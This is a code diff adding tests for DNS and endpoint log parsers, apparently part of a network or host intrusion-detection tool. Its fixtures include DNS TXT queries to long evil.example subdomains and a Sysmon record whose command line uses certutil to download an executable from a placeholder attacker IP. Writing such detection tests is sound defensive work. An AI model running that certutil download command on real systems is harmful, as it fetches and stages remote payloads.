@@ -57,6 +57,59 @@ def main() -> None:
     assert "whoami" in endpoint_events[0].payload_clean
     assert endpoint_events[0].dst_port == 8080
 
+    zeek_dns = tmp / "dns_zeek.log"
+    zeek_dns.write_text(
+        "#separator \\x09\n"
+        "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tquery\tqtype_name\n"
+        "1782542500.0\tC1\t10.10.10.20\t5353\t8.8.8.8\t53\tudp\tbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.evil.example\tTXT\n",
+        encoding="utf-8",
+    )
+    zeek_events = parse_dns_log(zeek_dns)
+    assert len(zeek_events) == 1
+    assert zeek_events[0].src_ip == "10.10.10.20"
+    assert zeek_events[0].dns_qtype == "TXT"
+
+    suricata = tmp / "suricata_dns.jsonl"
+    suricata.write_text(
+        json.dumps(
+            {
+                "timestamp": "2026-06-27T06:40:31Z",
+                "event_type": "dns",
+                "src_ip": "10.10.10.20",
+                "dest_ip": "8.8.4.4",
+                "dns": {"rrname": "cccccccccccccccccccccccccccccccc.evil.example", "rrtype": "TXT"},
+            }
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    suricata_events = parse_dns_log(suricata)
+    assert len(suricata_events) == 1
+    assert suricata_events[0].dns_query.startswith("cccc")
+
+    sysmon = tmp / "sysmon.jsonl"
+    sysmon.write_text(
+        json.dumps(
+            {
+                "UtcTime": "2026-06-27T06:40:20Z",
+                "EventID": 1,
+                "Computer": "victim",
+                "EventData": {
+                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    "CommandLine": "powershell -c whoami; certutil -urlcache -f http://203.0.113.60/a.exe a.exe",
+                    "DestinationIp": "203.0.113.60",
+                    "DestinationPort": "8081",
+                },
+            }
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    sysmon_events = parse_endpoint_log(sysmon)
+    assert len(sysmon_events) == 1
+    assert "certutil" in sysmon_events[0].payload_clean
+    assert sysmon_events[0].dst_ip == "203.0.113.60"
+
 
 if __name__ == "__main__":
     main()
